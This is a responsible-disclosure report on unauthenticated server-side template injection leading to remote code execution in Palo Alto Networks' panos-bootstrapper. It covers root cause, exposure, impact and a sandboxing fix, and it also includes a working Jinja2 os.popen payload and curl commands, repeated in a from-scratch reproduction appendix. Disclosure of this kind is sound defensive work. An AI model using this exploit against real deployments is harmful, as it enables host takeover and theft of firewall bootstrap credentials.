# Unauthenticated Server-Side Template Injection leading to Remote Code Execution in `panos-bootstrapper`

| | |
|---|---|
| **Reporter** | Daghlar Mammadov |
| **Contact** | daghlarmammadov@gmail.com |
| **Date** | 2026-06-23 |
| **Vendor** | Palo Alto Networks |
| **Affected project** | https://github.com/PaloAltoNetworks/panos-bootstrapper |
| **Verified commit** | `8128161a2cc1f4236274ed9cb2281c873734d673` (`master`) |
| **Severity** | Critical — unauthenticated Remote Code Execution |

## Overview

The `PaloAltoNetworks/panos-bootstrapper` service exposes an unauthenticated HTTP
API for generating PAN-OS NGFW bootstrap packages. Two endpoints —
`POST /import_template` and `POST /render_template` — together allow a remote,
unauthenticated attacker to persist an arbitrary Jinja2 template and then have
the server render it through Flask's `render_template_string()`. Because that
call uses a non-sandboxed Jinja2 environment, a crafted template achieves
**Server-Side Template Injection (SSTI) and full Remote Code Execution (RCE)**
in the context of the service account.

I have verified end-to-end, unauthenticated command execution over HTTP against
the project's own code (details and reproduction below).

| Field | Value |
|-------|-------|
| Product | `PaloAltoNetworks/panos-bootstrapper` (Apache-2.0; "provides an API only" PAN-OS bootstrap utility) |
| Verified commit | `8128161a2cc1f4236274ed9cb2281c873734d673` (branch `master`) |
| Vulnerability class | CWE-1336 (SSTI) / CWE-94 (Code Injection) |
| Authentication | None required |
| Impact | Remote Code Execution / full host compromise |
| CVSS v3.1 | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` = **9.8 (Critical)** when the API is network-reachable (see *Exposure* §) |

---

## Root cause

The application registers its Flask routes with no authentication, authorization,
or CSRF protection of any kind (verified: no `before_request` guard, no
`login_required`, no API key, no session check anywhere in the codebase).

**1. Arbitrary template storage — `POST /import_template`**
`bootstrapper/bootstrapper.py:397`

```python
@app.route('/import_template', methods=['POST'])
def import_template():
    input_params = bootstrapper_utils.normalize_input_params(request)
    name = input_params['name']
    encoded_template = input_params['template']
    template = unquote(encoded_template)            # attacker-controlled, URL-decoded
    ...
    bootstrapper_utils.import_template(template, name, description, template_type)
```

`bootstrapper_utils.import_template()` (`bootstrapper/lib/bootstrapper_utils.py:85`)
writes the supplied string to the database verbatim — no validation, escaping, or
sandboxing.

**2. Unsandboxed render of the stored template — `POST /render_template`**
`bootstrapper/bootstrapper.py:515` → `bootstrapper_utils.compile_template()`
(`bootstrapper/lib/bootstrapper_utils.py:594`)

```python
def compile_template(configuration_parameters):
    template_name = configuration_parameters['template_name']
    required = get_required_vars_from_template(template_name)
    if not required.issubset(configuration_parameters):
        raise RequiredParametersError(...)
    template = get_template(template_name)          # loads attacker's stored template
    return render_template_string(template, **configuration_parameters)   # line 608
```

`render_template_string()` uses Flask's default, **non-sandboxed** Jinja2
environment, so any Jinja2 expression in the stored template is executed
server-side.

**Why the existing check does not mitigate it:** `compile_template()` calls
`get_required_vars_from_template()` and requires that the template's *undeclared*
variables be a subset of the supplied parameters. A standard SSTI payload built
from Jinja2's built-in globals (e.g. `cycler`, `lipsum`, `namespace`) declares
**no** undeclared variables, so the required set is empty, the check passes
unconditionally, and rendering proceeds.

---

## Proof of Concept

A remote, unauthenticated attacker performs two POST requests:

```bash
TARGET="http://<host>:5000"

# (1) Store a malicious Jinja2 template — no authentication
PAYLOAD='{{ cycler.__init__.__globals__.os.popen("id").read() }}'
ENC=$(python3 -c 'import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))' "$PAYLOAD")

curl -s -X POST "$TARGET/import_template" \
     -H 'Content-Type: application/json' \
     -d "{\"name\":\"pwn\",\"template\":\"$ENC\",\"description\":\"poc\",\"type\":\"bootstrap\"}"
# => {"message":"Imported Template Successfully","status_code":200,"success":true}

# (2) Render it — command output is returned in the HTTP response, no authentication
curl -s -X POST "$TARGET/render_template" \
     -H 'Content-Type: application/json' \
     -d '{"template_name":"pwn"}'
# => uid=1000(...) gid=1000(...) groups=...
```

### Verified result

Running the project's unmodified application and issuing exactly the two requests
above:

- Step (1) returned `{"success":true,"message":"Imported Template Successfully"}`.
- Step (2) returned the live output of `id` in the HTTP response body.
- A variant using `os.popen('id; echo HTTP_RCE_OK > /tmp/HTTP_RCE_PROOF')`
  created `/tmp/HTTP_RCE_PROOF` on disk — confirming arbitrary OS command
  execution, not merely template evaluation.

### Reproduction environment & fidelity

Testing exercised PAN's unmodified vulnerable code (`import_template`,
`compile_template`, and both routes). To run the service on Python 3.13, three
*unrelated* compatibility shims were applied, none of which touch the vulnerable
logic:
1. a stub for the removed `werkzeug.contrib.cache` (used only by `cache_utils`, off the vulnerable path);
2. removal of the deprecated `convert_unicode=True` SQLAlchemy keyword;
3. disabling the `before_first_request` init hook (it pre-loads templates from a directory and is unrelated to the two routes; `init_db()` was invoked manually instead).

`render_template_string()` is non-sandboxed across all Flask/Jinja2 releases, so
the result is version-independent.

---

## Exposure analysis

I want to characterise real-world reachability precisely rather than overstate it:

- **Default app binding:** the container entrypoint is
  `flask run --host=0.0.0.0 --port=5000` (Dockerfile), i.e. it listens on all
  interfaces, and the project is explicitly documented as "provides an API
  only" — it is designed to be consumed over the network. **Any deployment that
  exposes port 5000 (e.g. `docker run -p 5000:5000`, Kubernetes, or a custom
  compose) is remotely exploitable without authentication.**
- **Reference compose (mitigating):** `panos-bootstrapper-ui/docker-compose.yml`
  binds the backend to `127.0.0.1:5001:5000` (localhost only) and the `cnc` UI
  it publishes on port 80 calls only `/generate_bootstrap_package`, which renders
  *stored* templates by name and does not accept arbitrary template content. In
  that specific topology the SSTI endpoints are not remotely reachable.

Net: the issue is critical in any direct-API-exposure deployment (which the app
default and intended usage permit) and not reachable in the localhost-bound
reference compose.

---

## Impact

Successful exploitation yields arbitrary code execution as the service user on the
host running `panos-bootstrapper`. Beyond host takeover, this utility processes
firewall provisioning material (init-cfg.txt / bootstrap.xml, cloud storage
credentials, licensing and auth codes), so compromise can also expose sensitive
NGFW bootstrap data handled by the service.

---

## Remediation

1. Render templates with a sandboxed engine
   (`jinja2.sandbox.SandboxedEnvironment`), or remove user-supplied template
   rendering entirely.
2. Require authentication/authorization on all rendering and state-changing
   endpoints; treat imported templates as untrusted data.
3. Bind the service to loopback by default and document that the API must never
   be exposed to untrusted networks.

---

## Scope note (disclosed up front)

`panos-bootstrapper` is currently **archived** (read-only; last commit
2026-04-07) and the companion `panos-bootstrapper-ui` has not been updated since
2019. Both are community/OSS deployment utilities rather than commercial-catalog
products. I am submitting this as a genuine, verified pre-authentication RCE in
published Palo Alto Networks software and defer to PSIRT on program eligibility;
it is reported in good faith regardless of bounty outcome, and warrants a CVE
and/or an end-of-life security advisory directing users away from network
exposure.

## Disclosure

Reported privately to Palo Alto Networks PSIRT. I will not disclose publicly until
a fix or advisory is published, per program policy.

---

## Appendix A — Independent reproduction from scratch

```bash
# 1. Obtain the affected code
git clone https://github.com/PaloAltoNetworks/panos-bootstrapper.git
cd panos-bootstrapper

# 2. Run the service (reference container)
#    The Dockerfile entrypoint is: flask run --host=0.0.0.0 --port=5000
docker build -t panos-bootstrapper .
docker run --rm -p 5000:5000 panos-bootstrapper
#    (Any deployment that exposes port 5000 is sufficient; see Exposure §.)

# 3. Exploit — two unauthenticated POST requests
TARGET="http://127.0.0.1:5000"
PAYLOAD='{{ cycler.__init__.__globals__.os.popen("id").read() }}'
ENC=$(python3 -c 'import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))' "$PAYLOAD")

curl -s -X POST "$TARGET/import_template" \
     -H 'Content-Type: application/json' \
     -d "{\"name\":\"pwn\",\"template\":\"$ENC\",\"description\":\"poc\",\"type\":\"bootstrap\"}"
# => {"message":"Imported Template Successfully","status_code":200,"success":true}

curl -s -X POST "$TARGET/render_template" \
     -H 'Content-Type: application/json' \
     -d '{"template_name":"pwn"}'
# => uid=... gid=... groups=...   (command output returned in the HTTP response)
```

**Sanity checks performed (all passed):**
- `{{7*7}}` rendered to `49` — confirms genuine Jinja2 evaluation, not string passthrough.
- `os.popen("uname -sm; echo OK > /tmp/RCE")` returned `Linux x86_64` and created the file — confirms OS command execution.
- The imported template is stored byte-for-byte unmodified in the `templates` DB table (no sanitization).
- Both `/import_template` and `/render_template` require no authentication, token, or session (`normalize_input_params` only parses JSON/form bodies).

## Appendix B — Suggested fix (illustrative)

```python
# bootstrapper/lib/bootstrapper_utils.py
from jinja2.sandbox import SandboxedEnvironment

def compile_template(configuration_parameters):
    template_name = configuration_parameters['template_name']
    template = get_template(template_name)
    if template is None:
        raise TemplateNotFoundError('Could not load %s' % template_name)
    env = SandboxedEnvironment()           # sandboxed instead of render_template_string
    return env.from_string(template).render(**configuration_parameters)
```
Additionally: enforce authentication on all endpoints, and bind the service to
loopback by default.
